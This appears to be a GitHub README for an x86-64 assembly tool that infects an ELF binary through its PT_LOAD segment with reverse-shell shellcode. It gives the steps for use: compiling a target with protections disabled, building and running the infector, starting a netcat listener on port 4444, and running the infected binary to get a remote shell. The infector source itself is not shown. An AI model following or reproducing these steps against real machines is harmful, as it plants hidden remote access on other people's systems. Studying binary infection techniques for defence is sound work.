# asm64_reverseshell_PT_load

### Prerequisites

- A C file with a simple `printf` statement.
- A shellcode in hexadecimal format.
- NASM injection code

## Steps

### 1. Compilation of the C File

* gcc
  ```sh
  gcc -fno-stack-protector -z execstack -no-pie fic_test.c -o fic_test![image](https://github.com/lmichel9/asm64_reverseshell_PT_load/assets/119668314/9c8b9b8b-29bf-4ca6-8a49-f826e0bdd9c1)
  ```

### 2. Compilation of the NASM Code

* nasm
  ```sh
  nasm -f elf64 infection_PTnode.asm -o infection_PTnode.o
  ld -o infection_PTnode infection_PTnode.o
  ```
### 3. Execution
#### Execution of the infection code
  ```sh
  ./infection_PTnode
  ```
#### Listening on port 4444 on client side
  ```sh
  nc -lvnp 4444
  ```
#### Execution of the Infected Binary
  ```sh
  ./fic_test

  ```


